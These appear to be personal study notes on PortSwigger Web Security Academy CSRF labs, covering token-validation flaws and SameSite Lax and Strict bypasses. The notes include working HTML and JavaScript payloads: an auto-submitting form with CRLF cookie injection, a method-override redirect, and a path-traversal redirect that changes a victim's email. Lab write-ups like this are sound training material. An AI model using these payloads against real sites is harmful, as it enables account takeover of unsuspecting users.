# CSRF

## Practitioner
- CSRF where token validation depends on request method
    - Notice that CSRF validation does not exist for GET requests. Use the exploit server to stage a RCE which automatically triggers a GET request to the /change-email endpoint and submits on page load.
- CSRF where token validation depends on token being present
    - Similar exploit, but it's a POST request and simply does not include the CSRF token.
- CSRF where the token is not tied to the user session
    - Similar–– craft a malicious form using the unused CSRF token from another user to trick the server.
- CSRF where token is tied to non-session cookie
- CSRF where token is duplicated in cookie
    - Since the server merely checks if the csrf token matches the cookie, we stage an exploit to update the search query parameter sink to set a fake crsf cookie, and set the csrf token to the same fake value.
    ```
    <form action="https://0ae800630314cfa683893c200074004f.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="evil@hacker.net" />
    <input type="hidden" name="csrf" value="fake" />
    </form>
    <img src="https://0ae800630314cfa683893c200074004f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();" />
    ```
- Same site lax bypass via method override
    - The samesite attribute defaults to Lax, which means the cookie will be sent in cross-site GET requests. Craft a payload that navigates to the change-email endpoint and uses the _method query parameter to override the HTTP request method.
    ```
    <script>
    document.location = "https://0ac3000203ca9b4add16983800c00022.web-security-academy.net/my-account/change-email?email=pwnedo@web-security-academy.net&_method=POST";
    </script>
    ```

- Samesite strict bypass via client-side redirect
After posting a comment, you are briefly redirect to a page /post/comment/confirmation?postId=7. The redirect is handled client-side by the javascript file /resources/js/commentConfirmationRedirect.js:
```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
The postId is directly used to construct the redirection path, which canm be exploited with path traversal. We exploit this redirect path traversal to access the strict session cookie to change the email.
```
<script>
    document.location = "https://0afe00bd04a2155a81a117a3004f0014.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email/?email=evil%40hacker.net%26submit=1"
</script>
```

[Cross-site websocket hijacking (CSWSH)](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
